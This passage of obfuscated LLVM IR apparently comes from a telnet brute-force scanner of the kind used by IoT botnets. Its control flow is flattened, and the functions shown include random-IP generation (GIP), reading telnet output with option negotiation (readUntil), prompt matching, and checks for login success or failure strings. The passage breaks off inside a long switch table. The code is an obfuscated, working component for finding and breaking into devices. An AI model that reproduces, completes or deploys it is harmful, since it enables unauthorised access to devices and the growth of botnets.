  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 -938275176, i32 -1938730213
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1830929941, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 1984456698, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -1443218267, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1830929941, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1875596905, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1875596905, label %first
    i32 549985098, label %8
    i32 932317219, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 549985098, i32 932317219
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 932317219, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1503910232, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1503910232, label %first
    i32 836296632, label %7
    i32 -1366240985, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 -1366240985, i32 836296632
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 -1366240985, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.91, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -988770800, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -988770800, label %11
    i32 -1656429153, label %18
    i32 -2111800243, label %19
    i32 270011340, label %24
    i32 -314247248, label %37
    i32 113252964, label %50
    i32 -1072969354, label %63
    i32 291475217, label %75
    i32 961673590, label %76
    i32 1863428245, label %78
    i32 -1140822198, label %81
    i32 -226372487, label %100
    i32 -518323925, label %101
    i32 -1639869109, label %102
    i32 -1134503261, label %105
    i32 366636978, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -1656429153, i32 -1134503261
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -2111800243, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 270011340, i32 961673590
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 291475217, i32 -314247248
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 291475217, i32 113252964
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 291475217, i32 -1072969354
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 291475217, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 961673590, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 1863428245, i32 -1140822198
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -2111800243, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 -226372487, i32 -518323925
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 366636978, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -1639869109, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -988770800, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 366636978, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 -1269819090, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1269819090, label %33
    i32 -1351943711, label %39
    i32 -673009965, label %44
    i32 36430848, label %48
    i32 -1399616512, label %49
    i32 1763121851, label %51
    i32 -1565894060, label %52
    i32 1123575516, label %61
    i32 -2144590396, label %78
    i32 435852563, label %79
    i32 1476313439, label %91
    i32 716621991, label %95
    i32 -1777567262, label %96
    i32 637616439, label %105
    i32 1812524438, label %114
    i32 -1556612826, label %118
    i32 -134068758, label %119
    i32 1294512362, label %128
    i32 -1710747405, label %129
    i32 2126947806, label %130
    i32 795731385, label %136
    i32 -894200944, label %140
    i32 -1219407437, label %145
    i32 -1051985690, label %146
    i32 1177203760, label %147
    i32 45120799, label %148
    i32 -805165990, label %152
    i32 1633059516, label %153
    i32 717978064, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -1351943711, i32 -1399616512
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 36430848, i32 -673009965
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 36430848, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1399616512, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 1763121851, i32 45120799
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1565894060, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #3, !srcloc !5
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 1123575516, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 -2144590396, i32 435852563
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 45120799, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 716621991, i32 1476313439
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 716621991, i32 -1777567262
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 717978064, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 637616439, i32 2126947806
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 -1556612826, i32 1812524438
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -1556612826, i32 -134068758
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 717978064, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 -1710747405, i32 1294512362
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 717978064, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 1177203760, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #9
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 -1219407437, i32 795731385
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -894200944, i32 -1051985690
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 -1219407437, i32 -1051985690
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 45120799, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 1177203760, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -1269819090, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 -805165990, i32 1633059516
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 717978064, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 717978064, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #3
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #3
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #3
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 -535928606, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -535928606, label %14
    i32 -153607722, label %19
    i32 1362428012, label %24
    i32 2046317142, label %29
    i32 1871276878, label %34
    i32 129828001, label %39
    i32 -426260211, label %44
    i32 -1407965405, label %49
    i32 -128685620, label %54
    i32 677541354, label %59
    i32 -946656272, label %64
    i32 -252552997, label %69
    i32 -1756766829, label %74
    i32 -1608867481, label %79
    i32 1641754335, label %84
    i32 -158090497, label %89
    i32 -1426769912, label %94
    i32 -364048295, label %99
    i32 -1319406081, label %104
    i32 -1840346017, label %109
    i32 -2082982414, label %114
    i32 -202331253, label %119
    i32 -1791153457, label %124
    i32 -581271482, label %129
    i32 -1698291589, label %134
    i32 775580994, label %139
    i32 -820774542, label %144
    i32 1307193967, label %149
    i32 -474191136, label %154
    i32 1618105326, label %159
    i32 -1874675667, label %164
    i32 2129366538, label %169
    i32 835469971, label %174
    i32 -1940529899, label %179
    i32 629741033, label %184
    i32 -1942364311, label %189
    i32 1851287275, label %194
    i32 -2106091420, label %199
    i32 -1284318048, label %204
    i32 642472940, label %209
    i32 1514902116, label %214
    i32 -1754803896, label %219
    i32 261616130, label %224
    i32 1675940507, label %229
    i32 -1425331009, label %234
    i32 -1590067463, label %239
    i32 -1914989408, label %244
    i32 -495063033, label %249
    i32 -1003292442, label %254
    i32 -1393927709, label %259
    i32 -1305308884, label %264
    i32 -87039057, label %269
    i32 -436810863, label %274
    i32 -708152501, label %279
    i32 1631236471, label %284
    i32 153303996, label %289
    i32 -110080749, label %294
    i32 1430300501, label %299
    i32 1264107558, label %304
    i32 569211932, label %309
    i32 -434609595, label %314
    i32 -1098284005, label %319
    i32 -819585564, label %324
    i32 -1801896643, label %329
    i32 -862073916, label %334
    i32 -1031562281, label %339
    i32 -496662150, label %344
    i32 1949651290, label %349
    i32 -757902445, label %354
    i32 -1101744231, label %359
    i32 -1849738317, label %364
    i32 -897398318, label %369
    i32 88846480, label %374
    i32 35471922, label %379
    i32 -1541524797, label %384
    i32 -956892151, label %389
    i32 -441752581, label %394
    i32 853690139, label %399
    i32 1296633590, label %404
    i32 1849009208, label %409
    i32 1894917971, label %414
    i32 -1100816613, label %419
    i32 389943913, label %424
    i32 -378314984, label %429
    i32 -118436061, label %434
    i32 -188836204, label %439
    i32 -1781465014, label %444
    i32 -1002669039, label %449
    i32 1712173856, label %454
    i32 549316898, label %459
    i32 241101006, label %464
    i32 2026072626, label %469
    i32 -1855696025, label %474
    i32 -70733831, label %479
    i32 -588796058, label %484
    i32 -268819456, label %489
    i32 145706434, label %494
    i32 913008154, label %499
    i32 433511616, label %504
    i32 -1722670367, label %509
    i32 1234923463, label %514
    i32 -1799177123, label %519
    i32 134532184, label %524
    i32 -1796006511, label %529
    i32 -648636096, label %534
    i32 1527131370, label %539
    i32 -1666080216, label %544
    i32 -1808819435, label %549
    i32 -2116055128, label %554
    i32 655964172, label %559
    i32 480570408, label %564
    i32 417161250, label %569
    i32 466401314, label %574
    i32 486647128, label %579
    i32 -692838405, label %584
    i32 196652401, label %589
    i32 198752544, label %594
    i32 -256073832, label %599
    i32 1057213214, label %604
    i32 -202799890, label %609
    i32 383398861, label %614
    i32 -1382556860, label %619
    i32 1056592910, label %624
    i32 -1313292224, label %629
    i32 595052173, label %634
    i32 -1880333291, label %639
    i32 487413656, label %644
    i32 497360525, label %649
    i32 -1501788143, label %654
    i32 1797021440, label %659
    i32 -480639031, label %664
    i32 -1211761950, label %669
    i32 -1714676831, label %674
    i32 502685754, label %679
    i32 -1576597338, label %684
    i32 -1007647702, label %689
    i32 56501254, label %694
    i32 -437352318, label %699
    i32 -1494844227, label %704
    i32 802257231, label %709
    i32 -997063949, label %714
    i32 -1180340623, label %719
    i32 -1661544018, label %724
    i32 -616062532, label %729
    i32 -131163237, label %734
    i32 -1977882445, label %739
    i32 -120721899, label %744
    i32 772173178, label %749
    i32 1315573176, label %754
    i32 -512774789, label %759
    i32 -976533527, label %764
    i32 -396269382, label %769
    i32 -1759077456, label %774
    i32 -1017344100, label %779
    i32 -2012643135, label %784
    i32 1146422912, label %789
    i32 -1345101448, label %794
    i32 -1920151540, label %799
    i32 -1019237649, label %804
    i32 -1922999310, label %809
    i32 931495808, label %814
    i32 1874919874, label %819
    i32 247190400, label %824
    i32 221317019, label %829
    i32 -1275305560, label %834
    i32 -2105337814, label %839
    i32 -73677535, label %844
    i32 1003905536, label %849
    i32 -1127252625, label %854
    i32 -1776778679, label %859
